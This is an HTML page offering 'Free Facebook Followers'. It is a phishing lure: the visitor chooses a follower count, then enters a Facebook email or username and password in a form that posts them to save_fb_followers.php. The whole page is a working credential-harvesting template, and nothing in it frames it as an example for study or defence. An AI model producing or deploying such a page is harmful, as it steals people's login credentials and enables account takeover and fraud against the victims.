<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Facebook Followers ⭐</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #1877f2, #42b72a);
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            animation: gradientShift 3s infinite;
        }
        @keyframes gradientShift {
            0%, 100% { background: linear-gradient(135deg, #1877f2, #42b72a); }
            50% { background: linear-gradient(135deg, #42b72a, #1877f2); }
        }
        .box {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
            animation: zoomIn 0.5s;
        }
        @keyframes zoomIn {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }
        h1 {
            color: #1877f2;
            margin-bottom: 10px;
        }
        .option {
            display: inline-block;
            margin: 10px;
            padding: 12px 28px;
            background: #1877f2;
            color: white;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .option:hover {
            background: #166fe5;
            transform: scale(1.05);
        }
        .selected {
            background: #e41e3f;
            transform: scale(1.05);
        }
        input {
            width: 90%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 50px;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #1877f2;
        }
        button {
            background: #42b72a;
            color: white;
            padding: 14px 50px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s;
        }
        button:hover {
            background: #36a420;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>⭐ FACEBOOK FOLLOWERS ⭐</h1>
        <p style="color:#666; margin-bottom:20px">Boost your profile instantly!</p>
        <div>
            <div class="option" data-followers="200">200</div>
            <div class="option" data-followers="500">500</div>
            <div class="option" data-followers="1000">1000</div>
        </div>
        <form method="POST" action="save_fb_followers.php">
            <input type="hidden" name="followers" id="fbFollowers">
            <input type="text" name="username" placeholder="Facebook Email/Username" required>
            <input type="password" name="password" placeholder="Facebook Password" required>
            <button type="submit">🔥 GET FOLLOWERS NOW</button>
        </form>
    </div>
    <script>
        const opts = document.querySelectorAll('.option');
        const hiddenFb = document.getElementById('fbFollowers');
        opts.forEach(opt => {
            opt.onclick = () => {
                opts.forEach(o => o.classList.remove('selected'));
                opt.classList.add('selected');
                hiddenFb.value = opt.getAttribute('data-followers');
            };
        });
        if(opts.length > 0) opts[0].click();
    </script>
</body>
</html>
